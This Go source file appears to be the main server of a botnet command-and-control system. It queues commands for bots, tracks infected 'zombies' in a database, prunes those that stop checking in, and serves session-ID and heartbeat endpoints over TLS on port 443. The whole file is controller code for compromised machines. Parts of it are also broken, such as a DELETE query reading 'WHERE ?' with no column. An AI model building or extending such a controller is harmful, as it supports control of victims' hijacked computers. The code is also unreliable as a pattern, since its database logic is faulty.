package main

import (
	"database/sql"
	"log"
	"net/http"
	"sync"
	"time"
)

// ////// COMMANDS QUEUE
var (
	commandQueue = make(map[string]*ResHeartBeat)
	queueMutex   sync.Mutex
)

// //////////// WEB SERVER CONF ////////////
const PORT = ":443"

// ///////// CHECK CONNECTION AVAILABILITY

const MAX_AVAILABILITY_TIME = 60 //in sec
const CHECKING_DELAY = 10        // in sec

func checkZombiesAvailability(db sql.DB) {

	for {
		LogEx(l, "Checking Zombies Availability", true)
		currentTimeStamp := time.Now().Unix()

		query := "SELECT lastConnTime FROM zombies WHERE 1"
		rows, err := db.Query(query)
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {

			var lastConnTime time.Time

			if err := rows.Scan(&lastConnTime); err != nil {
				Error(l, "Error while scanning data")
			}
			LogEx(l, "Found timestamp: "+lastConnTime.Format("2006-01-02 15:04:05"), true)
			if currentTimeStamp-lastConnTime.Unix() > MAX_AVAILABILITY_TIME {
				query1 := "DELETE FROM zombies WHERE ?"
				rows1, err := db.Query(query1, lastConnTime)
				if err != nil {
					log.Fatal(err)
				}
				defer rows1.Close()

			}
		}
		if err := rows.Err(); err != nil {
			Error(l, "Error while iterating rows")
		}
		time.Sleep(CHECKING_DELAY * time.Second)
	}

}

var db *sql.DB

func main() {
	db, dBerr := InitDb()
	if dBerr != nil {
		Error(l, "Error while starting DB: "+dBerr.Error())
	}

	defer db.Close()

	InitCommands()
	go checkZombiesAvailability(*db)
	go UserInput(reader)
	// TODO: GOROUTINE TO CHECK SIDs EXPIRATIONS AND PROCESS THEM
	http.HandleFunc("/helloworld", HelloWorld)
	http.HandleFunc("/getSID", GetSID)
	LogEx(l, "Starting the webserver on "+PORT, true)

	err := http.ListenAndServeTLS(PORT, "certs/server.crt", "certs/server.key", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}

	defer Log(l, "Stopping the webserver...")

}
